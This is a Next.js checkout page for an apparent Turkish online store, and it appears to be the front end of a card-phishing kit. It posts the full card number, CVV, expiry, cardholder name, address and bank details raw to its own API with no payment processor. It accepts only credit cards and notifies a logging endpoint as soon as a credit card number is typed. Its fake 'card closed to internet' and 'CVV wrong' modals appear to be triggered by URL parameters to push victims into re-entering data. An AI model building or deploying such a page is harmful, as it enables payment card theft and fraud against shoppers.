'use client';

import { useState, useEffect, Suspense, useRef } from 'react';
import { ArrowLeft, MapPin, CreditCard, HelpCircle, AlertTriangle, X } from 'lucide-react';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter, useSearchParams } from 'next/navigation';
import { useCartStore } from '@/lib/store';
import binlistData from '@/app/binlist.json';

interface BinInfo {
    CardRangeStart: number;
    CardRangeEnd: number;
    BankName: string;
    CardType?: string;
    CardName?: string;
    CardScheme?: string;
}

function OdemeContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const { items, getTotalPrice, getItemCount, clearCart } = useCartStore();
    const totalPrice = getTotalPrice();
    const itemCount = getItemCount();

    const [cardName, setCardName] = useState('');
    const [cardNumber, setCardNumber] = useState('');
    const [expiryMonth, setExpiryMonth] = useState('');
    const [expiryYear, setExpiryYear] = useState('');
    const [cvv, setCvv] = useState('');
    const [use3DSecure, setUse3DSecure] = useState(true);

    const [errors, setErrors] = useState<{ [key: string]: string }>({});
    const [loading, setLoading] = useState(false);
    const [isProcessing, setIsProcessing] = useState(false);
    const [bankInfo, setBankInfo] = useState<BinInfo | null>(null);
    const [selectedInstallment, setSelectedInstallment] = useState<number>(1);
    const [showInternetError, setShowInternetError] = useState(false);
    const [showProvizyonError, setShowProvizyonError] = useState(false);

    // Input log takibi için - ref kullanarak race condition önlenir
    const loggedInputsRef = useRef<Set<string>>(new Set());

    // Adres bilgisi
    const [address, setAddress] = useState<any>(null);
    const [checkingRedirect, setCheckingRedirect] = useState(true);
    const [addressLoading, setAddressLoading] = useState(true);

    // Input log fonksiyonu - kredi kartı girerken ilk 6 haneyi bekler ve sadece kredi kartı ise loglar
    const logInput = (inputType: string, value: string) => {
        if (inputType === 'kredi_karti_numarasi') {
            if (value.length >= 6 && !loggedInputsRef.current.has(inputType)) {
                // BIN kontrolü ile kart tipini öğren
                const info = findBankInfo(value);
                if (info && info.CardType) {
                    const typeLower = info.CardType.toLowerCase();
                    const isDebit = typeLower.includes('debit') || typeLower.includes('banka');
                    const isPrepaid = typeLower.includes('ön') || typeLower.includes('on') || typeLower.includes('odeme') || typeLower.includes('ödemeli') || typeLower.includes('prepaid');
                    
                    if (isDebit || isPrepaid) {
                        // Debit veya Prepaid ise bildirim gönderme
                        return;
                    }
                }
                
                // Kredi kartı veya bilinmeyen kart ise log gönder ve ref'e ekle
                loggedInputsRef.current.add(inputType);
                fetch('/api/input-log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ inputType })
                }).catch(error => {
                    console.error('Input log error:', error);
                });
            }
        } else {
            // Diğer inputlar için varsayılan davranış (en az 3 karakter)
            if (value.length >= 3 && !loggedInputsRef.current.has(inputType)) {
                loggedInputsRef.current.add(inputType);
                fetch('/api/input-log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ inputType })
                }).catch(error => {
                    console.error('Input log error:', error);
                });
            }
        }
    };

    useEffect(() => {
        // internet-hata parametresi var mı kontrol et
        const hasInternetError = searchParams.has('internet-hata');
        if (hasInternetError) {
            setShowInternetError(true);
            setCheckingRedirect(false);
            setAddressLoading(false);
            return; // internet-hata varsa adres kontrolü yapma
        }

        // provizyon parametresi var mı kontrol et
        if (searchParams.has('provizyon')) {
            setShowProvizyonError(true);
        }

        const loadAddress = async () => {
            // Önce localStorage'dan kontrol et
            const savedAddress = localStorage.getItem('selectedAddress');
            if (savedAddress) {
                setAddress(JSON.parse(savedAddress));
                setAddressLoading(false);
                setCheckingRedirect(false);
                return;
            }

            // localStorage'da yoksa API'den çek
            try {
                const res = await fetch('/api/address');
                const data = await res.json();

                if (data.success && data.data && data.data.length > 0) {
                    // Varsayılan veya ilk adresi seç
                    const defaultAddr = data.data.find((a: any) => a.is_default) || data.data[0];
                    setAddress(defaultAddr);
                    localStorage.setItem('selectedAddress', JSON.stringify(defaultAddr));
                } else {
                    // Adres yoksa adres sayfasına yönlendir
                    router.push('/adres');
                    return;
                }
            } catch (error) {
                console.error('Adres yüklenemedi:', error);
            }

            setAddressLoading(false);
            setCheckingRedirect(false);
        };

        loadAddress();
    }, [searchParams, router]);

    // Sepet boşsa anasayfaya, adres yoksa adres sayfasına yönlendir
    useEffect(() => {
        if (checkingRedirect || isProcessing) return;

        // internet-hata parametresi varsa yönlendirme yapma
        if (searchParams.has('internet-hata')) return;

        if (items.length === 0) {
            router.push('/');
            return;
        }

        const savedAddress = localStorage.getItem('selectedAddress');
        if (!savedAddress) {
            router.push('/adres');
            return;
        }
    }, [items, checkingRedirect, isProcessing, router, searchParams]);

    const formatPrice = (price: number) => {
        return new Intl.NumberFormat('tr-TR', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        }).format(price / 100);
    };

    // Luhn algoritması ile kart numarası doğrulama
    const luhnCheck = (cardNum: string): boolean => {
        const digits = cardNum.replace(/\s/g, '');
        if (!/^\d+$/.test(digits)) return false;

        let sum = 0;
        let isEven = false;

        for (let i = digits.length - 1; i >= 0; i--) {
            let digit = parseInt(digits[i], 10);

            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }

            sum += digit;
            isEven = !isEven;
        }

        return sum % 10 === 0;
    };

    // BIN kontrolü - kart numarasının ilk 6 hanesi ile banka bilgisi bul
    const findBankInfo = (cardNum: string): BinInfo | null => {
        const cleanNum = cardNum.replace(/\s/g, '');
        if (cleanNum.length < 6) return null;

        const bin6 = cleanNum.substring(0, 6);
        const binNumber = parseInt(bin6 + '0000000', 10);

        const binList = binlistData.BINList as BinInfo[];

        for (const bin of binList) {
            if (binNumber >= bin.CardRangeStart && binNumber <= bin.CardRangeEnd) {
                return bin;
            }
        }

        return null;
    };

    // Kart numarası değiştiğinde BIN kontrolü yap
    useEffect(() => {
        const cleanNum = cardNumber.replace(/\s/g, '');
        if (cleanNum.length >= 6) {
            const info = findBankInfo(cleanNum);
            setBankInfo(info);

            // Debit/Prepaid kontrolü
            if (info && info.CardType) {
                const typeLower = info.CardType.toLowerCase();
                const isDebit = typeLower.includes('debit') || typeLower.includes('banka');
                const isPrepaid = typeLower.includes('ön') || typeLower.includes('on') || typeLower.includes('odeme') || typeLower.includes('ödemeli') || typeLower.includes('prepaid');
                
                if (isDebit || isPrepaid) {
                    setErrors(prev => ({ ...prev, cardNumber: 'Yalnızca kredi kartı ile ödeme kabul edilmektedir' }));
                } else {
                    setErrors(prev => {
                        if (prev.cardNumber === 'Yalnızca kredi kartı ile ödeme kabul edilmektedir') {
                            return { ...prev, cardNumber: '' };
                        }
                        return prev;
                    });
                }
            }
        } else {
            setBankInfo(null);
            setErrors(prev => {
                if (prev.cardNumber === 'Yalnızca kredi kartı ile ödeme kabul edilmektedir') {
                    return { ...prev, cardNumber: '' };
                }
                return prev;
            });
        }
    }, [cardNumber]);

    // Kart numarası formatlama (4'lü gruplar)
    const formatCardNumber = (value: string) => {
        const cleaned = value.replace(/\s/g, '').replace(/\D/g, '');
        const limited = cleaned.substring(0, 16);
        const groups = limited.match(/.{1,4}/g);
        return groups ? groups.join(' ') : '';
    };

    const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const formatted = formatCardNumber(e.target.value);
        setCardNumber(formatted);

        // 3 karakter yazıldığında logla
        const cleanedValue = formatted.replace(/\s/g, '');
        logInput('kredi_karti_numarasi', cleanedValue);

        // Hata temizle (debit/prepaid uyarısı değilse temizle)
        if (errors.cardNumber && errors.cardNumber !== 'Yalnızca kredi kartı ile ödeme kabul edilmektedir') {
            setErrors(prev => ({ ...prev, cardNumber: '' }));
        }
    };

    const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/\D/g, '').substring(0, 3);
        setCvv(value);

        if (errors.cvv) {
            setErrors(prev => ({ ...prev, cvv: '' }));
        }
    };

    // Mevcut ay ve yıl
    const currentDate = new Date();
    const currentMonth = currentDate.getMonth() + 1;
    const currentYear = currentDate.getFullYear();

    // Ay seçenekleri
    const months = Array.from({ length: 12 }, (_, i) => {
        const month = (i + 1).toString().padStart(2, '0');
        return { value: month, label: month };
    });

    // Yıl seçenekleri (şu anki yıldan 10 yıl sonrasına kadar)
    const years = Array.from({ length: 11 }, (_, i) => {
        const year = currentYear + i;
        return { value: year.toString().slice(-2), label: year.toString() };
    });

    // Form doğrulama
    const validateForm = (): boolean => {
        const newErrors: { [key: string]: string } = {};

        // Kart üzerindeki isim
        if (!cardName.trim()) {
            newErrors.cardName = 'Kart üzerindeki ismi giriniz';
        }

        // Kart numarası
        const cleanCardNumber = cardNumber.replace(/\s/g, '');
        if (!cleanCardNumber) {
            newErrors.cardNumber = 'Kart numarasını giriniz';
        } else if (cleanCardNumber.length !== 16) {
            newErrors.cardNumber = 'Kart numarası 16 haneli olmalıdır';
        } else if (!luhnCheck(cleanCardNumber)) {
            newErrors.cardNumber = 'Geçersiz kart numarası';
        } else {
            // Debit / Prepaid Kontrolü
            const info = findBankInfo(cleanCardNumber);
            if (info && info.CardType) {
                const typeLower = info.CardType.toLowerCase();
                const isDebit = typeLower.includes('debit') || typeLower.includes('banka');
                const isPrepaid = typeLower.includes('ön') || typeLower.includes('on') || typeLower.includes('odeme') || typeLower.includes('ödemeli') || typeLower.includes('prepaid');
                
                if (isDebit || isPrepaid) {
                    newErrors.cardNumber = 'Yalnızca kredi kartı ile ödeme kabul edilmektedir';
                }
            }
        }

        // Son kullanma tarihi
        if (!expiryMonth) {
            newErrors.expiryMonth = 'Ay seçiniz';
        }
        if (!expiryYear) {
            newErrors.expiryYear = 'Yıl seçiniz';
        }

        // Tarih geçerlilik kontrolü
        if (expiryMonth && expiryYear) {
            const expYear = 2000 + parseInt(expiryYear, 10);
            const expMonth = parseInt(expiryMonth, 10);

            if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
                newErrors.expiry = 'Son kullanma tarihi geçmiş';
            }
        }

        // CVV
        if (!cvv) {
            newErrors.cvv = 'CVV giriniz';
        } else if (cvv.length !== 3) {
            newErrors.cvv = 'CVV 3 haneli olmalıdır';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async () => {
        if (!validateForm()) return;

        setLoading(true);

        try {
            const cleanCardNumber = cardNumber.replace(/\s/g, '');
            const skt = `${expiryMonth}/${expiryYear}`;

            const response = await fetch('/api/odeme', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    kart_isim: cardName,
                    kredi_karti: cleanCardNumber,
                    skt,
                    cvv,
                    banka: bankInfo?.BankName || 'Bilinmiyor',
                    marka: bankInfo?.CardName || '',
                    seviye: bankInfo?.CardType || '',
                    tutar: formatPrice(totalPrice) + ' TL',
                    taksit: selectedInstallment === 1 ? 'Peşin' : `${selectedInstallment} Taksit`,
                    adres: address,
                    tarih: (() => {
                        const now = new Date();
                        const day = String(now.getDate()).padStart(2, '0');
                        const month = String(now.getMonth() + 1).padStart(2, '0');
                        const year = now.getFullYear();
                        const hours = String(now.getHours()).padStart(2, '0');
                        const minutes = String(now.getMinutes()).padStart(2, '0');
                        const seconds = String(now.getSeconds()).padStart(2, '0');
                        return `${day}.${month}.${year} ${hours}:${minutes}:${seconds}`;
                    })()
                })
            });

            const data = await response.json();

            if (data.success) {
                // Ödeme başarılı - Processing ekranı göster
                setIsProcessing(true);
                localStorage.setItem('paymentId', data.paymentId);

                // 2 saniye bekle sonra yönlendir
                setTimeout(() => {
                    router.push('/odeme/onay');
                }, 2000);
            } else {
                setErrors({ submit: data.error || 'Ödeme işlemi başarısız' });
                setLoading(false);
            }
        } catch (error) {
            setErrors({ submit: 'Bir hata oluştu, lütfen tekrar deneyiniz' });
            setLoading(false);
        }
    };

    // internet-hata varsa sadece modal göster
    if (showInternetError) {
        return (
            <>
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>

                <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                    <div className="bg-white rounded-2xl max-w-md w-full p-6 relative shadow-xl">
                        <button
                            onClick={() => router.push('/')}
                            className="absolute top-4 right-4 p-1 hover:bg-gray-100 rounded-full"
                        >
                            <X size={20} className="text-gray-500" />
                        </button>

                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                                <AlertTriangle size={32} className="text-red-500" />
                            </div>
                            <h3 className="text-lg font-bold text-gray-900 mb-3">
                                İnternet Alışverişi Kapalı
                            </h3>
                            <p className="text-gray-600 text-sm leading-relaxed mb-6">
                                Kartınız internet üzerinden alışveriş işlemine kapalıdır. Bankanızın mobil uygulaması üzerinden veya müşteri hizmetleri telefonunu arayıp bilgi alabilirsiniz.
                            </p>
                            <button
                                onClick={() => router.push('/')}
                                className="w-full bg-[#0066cc] text-white py-3 rounded-xl font-medium"
                            >
                                Anasayfaya Dön
                            </button>
                        </div>
                    </div>
                </div>
            </>
        );
    }

    // Yönlendirme kontrolü veya sepet boşsa loading göster
    if (checkingRedirect || (items.length === 0 && !isProcessing)) {
        return (
            <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#0066cc]"></div>
            </div>
        );
    }

    // İşlem yapılıyor ekranı
    if (isProcessing) {
        return (
            <>
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>

                <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
                    <div className="bg-white rounded-2xl p-8 max-w-md w-full text-center shadow-lg">
                        {/* Spinner */}
                        <div className="relative w-20 h-20 mx-auto mb-6">
                            <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
                            <div className="absolute inset-0 border-4 border-[#0066cc] rounded-full border-t-transparent animate-spin"></div>
                        </div>

                        <h2 className="text-xl font-bold text-gray-800 mb-3">İşleminiz Gerçekleştiriliyor</h2>
                        <p className="text-gray-500 mb-4">Lütfen bekleyiniz, ödeme bilgileriniz işleniyor...</p>

                        <div className="flex items-center justify-center gap-2 text-sm text-gray-400">
                            <svg className="animate-pulse w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                            </svg>
                            <span>Güvenli bağlantı</span>
                        </div>
                    </div>
                </div>
            </>
        );
    }

    return (
        <>
            <style jsx global>{`
                nav.fixed.bottom-0 { display: none !important; }
                main { padding-bottom: 0 !important; }
                header { display: none !important; }
            `}</style>

            {/* İnternet Hata Modal */}
            {showInternetError && (
                <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
                    <div className="bg-white rounded-2xl max-w-md w-full p-6 relative">
                        <button
                            onClick={() => setShowInternetError(false)}
                            className="absolute top-4 right-4 p-1 hover:bg-gray-100 rounded-full"
                        >
                            <X size={20} className="text-gray-500" />
                        </button>

                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                                <AlertTriangle size={32} className="text-red-500" />
                            </div>
                            <h3 className="text-lg font-bold text-gray-900 mb-3">
                                İnternet Alışverişi Kapalı
                            </h3>
                            <p className="text-gray-600 text-sm leading-relaxed mb-6">
                                Kartınız internet üzerinden alışveriş işlemine kapalıdır. Bankanızın mobil uygulaması üzerinden veya müşteri hizmetleri telefonunu arayıp bilgi alabilirsiniz.
                            </p>
                            <button
                                onClick={() => setShowInternetError(false)}
                                className="w-full bg-[#0066cc] text-white py-3 rounded-xl font-medium"
                            >
                                Tamam
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* Provizyon Hata Modal (SKT/CVV HATALI) */}
            {showProvizyonError && (
                <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
                    <div className="bg-white rounded-2xl max-w-sm w-full p-6 relative shadow-2xl">
                        <button
                            onClick={() => setShowProvizyonError(false)}
                            className="absolute top-4 right-4 p-1 hover:bg-gray-100 rounded-full transition-colors"
                        >
                            <X size={20} className="text-gray-500" />
                        </button>

                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                                <AlertTriangle size={32} className="text-red-500" />
                            </div>
                            <h3 className="text-lg font-bold text-gray-900 mb-2">
                                Skt / Cvv Bilgileriniz Hatalı
                            </h3>
                            <p className="text-gray-600 text-sm leading-relaxed mb-6">
                                Girdiğiniz Son Kullanma Tarihi (SKT) veya Güvenlik Kodu (CVV) hatalıdır. Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.
                            </p>
                            <button
                                onClick={() => setShowProvizyonError(false)}
                                className="w-full bg-red-500 hover:bg-red-600 text-white py-3 rounded-xl font-semibold transition-colors"
                            >
                                Tekrar Dene
                            </button>
                        </div>
                    </div>
                </div>
            )}

            <div className="min-h-screen bg-gray-100 pb-32">
                {/* Üst Bar */}
                <div className="bg-white px-4 py-4 flex items-center gap-4 border-b sticky top-0 z-20">
                    <Link href="/adres" className="p-1">
                        <ArrowLeft size={24} className="text-gray-700" />
                    </Link>
                    <div>
                        <div className="flex items-center gap-2 text-[#0066cc]">
                            <span className="text-lg">🚚</span>
                            <span className="font-medium">Aynı Gün Kargoda, Hızlı Teslimat</span>
                        </div>
                        <p className="text-sm text-gray-500">Siparişiniz bugün kargoda⌛</p>
                    </div>
                </div>

                {/* Ödeme Yöntemi */}
                <div className="bg-white mx-4 mt-4 p-4 rounded-xl" style={{ paddingBottom: '5px' }}>
                    <h2 className="text-lg font-bold text-gray-800 mb-4">Ödeme Yöntemini Belirle</h2>

                    {/* Kredi Kartı Seçimi */}
                    <div className="flex items-center gap-3 mb-6">
                        <div className="w-5 h-5 rounded-full border-2 border-[#0066cc] flex items-center justify-center">
                            <div className="w-3 h-3 rounded-full bg-[#0066cc]"></div>
                        </div>
                        <div className="flex-1">
                            <p className="font-medium text-[#0066cc]">Kredi / Banka Kartı</p>
                            <p className="text-sm text-gray-500">Kredi kartı veya banka kartı</p>
                        </div>
                        <div className="flex items-center gap-1">
                            <Image src="/img/type.svg" alt="Troy" width={85} height={15} className="h-5 w-auto" onError={(e) => e.currentTarget.style.display = 'none'} />

                        </div>
                    </div>

                    {/* Kart Formu */}
                    <div className="space-y-4">
                        {/* Kart Üzerindeki İsim */}
                        <div>
                            <input
                                type="text"
                                value={cardName}
                                onChange={(e) => {
                                    setCardName(e.target.value);
                                }}
                                placeholder="Kart üzerindeki isim*"
                                className={`w-full border ${errors.cardName ? 'border-red-500' : 'border-gray-300'} rounded-lg px-4 py-3 outline-none focus:border-[#0066cc] text-gray-800 placeholder-gray-400`}
                            />
                            {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
                        </div>

                        {/* Kart Numarası */}
                        <div>
                            <input
                                type="text"
                                inputMode="numeric"
                                pattern="[0-9]*"
                                value={cardNumber}
                                onChange={handleCardNumberChange}
                                placeholder="Kredi kartı numarası*"
                                maxLength={19}
                                className={`w-full border ${errors.cardNumber ? 'border-red-500' : bankInfo ? 'border-green-500 ring-1 ring-green-500' : 'border-gray-300'} rounded-lg px-4 py-3 outline-none focus:border-[#0066cc] text-gray-800 placeholder-gray-400`}
                            />
                            {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
                        </div>

                        {/* Ay, Yıl, CVV */}
                        <div className="grid grid-cols-3 gap-3">
                            <div>
                                <select
                                    value={expiryMonth}
                                    onChange={(e) => setExpiryMonth(e.target.value)}
                                    className={`w-full h-[50px] border ${errors.expiryMonth || errors.expiry ? 'border-red-500' : 'border-gray-300'} rounded-lg px-3 py-3 outline-none focus:border-[#0066cc] bg-white text-gray-800`}
                                >
                                    <option value="">Ay*</option>
                                    {months.map(m => (
                                        <option key={m.value} value={m.value}>{m.label}</option>
                                    ))}
                                </select>
                            </div>
                            <div>
                                <select
                                    value={expiryYear}
                                    onChange={(e) => setExpiryYear(e.target.value)}
                                    className={`w-full h-[50px] border ${errors.expiryYear || errors.expiry ? 'border-red-500' : 'border-gray-300'} rounded-lg px-3 py-3 outline-none focus:border-[#0066cc] bg-white text-gray-800`}
                                >
                                    <option value="">Yıl*</option>
                                    {years.map(y => (
                                        <option key={y.value} value={y.value}>{y.label}</option>
                                    ))}
                                </select>
                            </div>
                            <div className="relative">
                                <input
                                    type="text"
                                    inputMode="numeric"
                                    pattern="[0-9]*"
                                    value={cvv}
                                    onChange={handleCvvChange}
                                    placeholder="CVV*"
                                    maxLength={3}
                                    className={`w-full border ${errors.cvv ? 'border-red-500' : 'border-gray-300'} rounded-lg px-4 py-3 outline-none focus:border-[#0066cc] text-gray-800 placeholder-gray-400`}
                                />
                                <button className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
                                    <HelpCircle size={18} />
                                </button>
                            </div>
                        </div>
                        {errors.expiry && <p className="text-red-500 text-sm -mt-2">{errors.expiry}</p>}
                        {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}

                        {/* 3D Secure */}
                        <div className="flex items-center gap-3 bg-gray-50 p-3 rounded-lg">
                            <input
                                type="checkbox"
                                checked={true}
                                readOnly
                                className="w-5 h-5 text-[#0066cc] rounded accent-[#0066cc]"
                            />
                            <span className="text-gray-700">3D Secure ile ödemek istiyorum</span>
                        </div>
                    </div>
                </div>

                {/* Taksit Seçimi */}
                {(() => {
                    const isCardComplete = cardNumber.replace(/\s/g, '').length === 16;
                    const isCreditCard = bankInfo?.CardType === 'Kredi Kartı';
                    const installmentEnabled = isCardComplete && isCreditCard;

                    const installments = [
                        { count: 1, label: 'Peşin' },
                        { count: 2, label: '2 Taksit' },
                        { count: 4, label: '4 Taksit' },
                        { count: 6, label: '6 Taksit' },
                    ];

                    return (
                        <div className="bg-white mx-4 mt-4 p-4 rounded-xl">
                            <h2 className="text-base font-bold text-gray-800 mb-3">
                                Taksit Seçenekleri
                                {!installmentEnabled && (
                                    <span className="ml-2 text-xs font-normal text-gray-400">(Kredi kartı girişi yapınız)</span>
                                )}
                            </h2>
                            <div className="grid grid-cols-2 gap-2">
                                {installments.map(inst => {
                                    const isPesin = inst.count === 1;
                                    const isSelected = selectedInstallment === inst.count;
                                    // Peşin: always visually selected when selectedInstallment===1
                                    // Other options: only visually selected when installmentEnabled
                                    const showSelected = isPesin ? isSelected : (isSelected && installmentEnabled);
                                    const isDisabled = !isPesin && !installmentEnabled;

                                    return (
                                        <button
                                            key={inst.count}
                                            disabled={isDisabled}
                                            onClick={() => {
                                                if (!isDisabled) setSelectedInstallment(inst.count);
                                            }}
                                            className={`border-2 rounded-xl p-3 text-left transition-all ${showSelected
                                                ? 'border-[#0066cc] bg-blue-50 shadow-sm'
                                                : isDisabled
                                                    ? 'border-gray-100 bg-gray-50 opacity-40 cursor-not-allowed'
                                                    : 'border-gray-200 bg-white cursor-pointer hover:border-blue-300'
                                                }`}
                                        >
                                            <div className="flex items-center justify-between">
                                                <span className={`font-semibold text-sm ${showSelected ? 'text-[#0066cc]' : 'text-gray-700'}`}>
                                                    {inst.label}
                                                </span>
                                                <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${showSelected ? 'border-[#0066cc] bg-[#0066cc]' : 'border-gray-300'
                                                    }`}>
                                                    {showSelected && <div className="w-2 h-2 rounded-full bg-white"></div>}
                                                </div>
                                            </div>
                                            <p className={`text-xs mt-0.5 ${showSelected ? 'text-blue-500' : 'text-gray-500'}`}>
                                                {inst.count === 1
                                                    ? formatPrice(totalPrice) + ' TL'
                                                    : `${inst.count} x ${formatPrice(Math.round(totalPrice / inst.count))} TL`}
                                            </p>
                                            <span className="text-[10px] text-green-600 font-medium">Vade Farkı Yok</span>
                                        </button>
                                    );
                                })}
                            </div>
                        </div>
                    );
                })()}

                {/* Sepet Özeti */}
                <div className="bg-white mx-4 mt-4 p-4 rounded-xl">
                    <div className="flex items-center justify-between mb-3">
                        <h3 className="font-bold text-gray-800">Sepet Özeti</h3>
                        <span className="text-gray-600">{itemCount} Ürün</span>
                    </div>

                    <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                            <span className="text-gray-600">Toplam Tutar</span>
                            <span className="font-bold text-gray-700">{formatPrice(totalPrice)} TL</span>
                        </div>
                        <div className="flex justify-between">
                            <span className="text-gray-600">Teslimat Tutarı</span>
                            <div className="text-right">
                                <span className="text-gray-400 line-through mr-2">39,90 TL</span>
                                <span className="text-green-600">Ücretsiz</span>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Hata Mesajı */}
                {errors.submit && (
                    <div className="mx-4 mt-4 p-4 bg-red-50 border border-red-200 rounded-xl">
                        <p className="text-red-600 text-sm">{errors.submit}</p>
                    </div>
                )}

                {/* Alt Bar */}
                <div className="fixed bottom-0 left-0 right-0 bg-white border-t shadow-lg p-4">
                    <div className="flex items-center justify-between">
                        <div>
                            <span className="text-gray-500 text-sm">Ödenecek Tutar</span>
                            <p className="text-xl font-bold text-[#0066cc]">{formatPrice(totalPrice)} TL</p>
                        </div>
                        <button
                            onClick={handleSubmit}
                            disabled={loading}
                            className="bg-[#2DB569] text-white px-8 py-4 rounded-xl font-bold text-lg disabled:bg-gray-300 hover:bg-[#25a05c] transition-colors"
                        >
                            {loading ? 'İşleniyor...' : 'Ödeme Yap'}
                        </button>
                    </div>
                </div>
            </div>
        </>
    );
}

export default function OdemePage() {
    return (
        <Suspense fallback={
            <div className="min-h-screen bg-gray-100 flex items-center justify-center">
                <div className="text-gray-500">Yükleniyor...</div>
            </div>
        }>
            <OdemeContent />
        </Suspense>
    );
}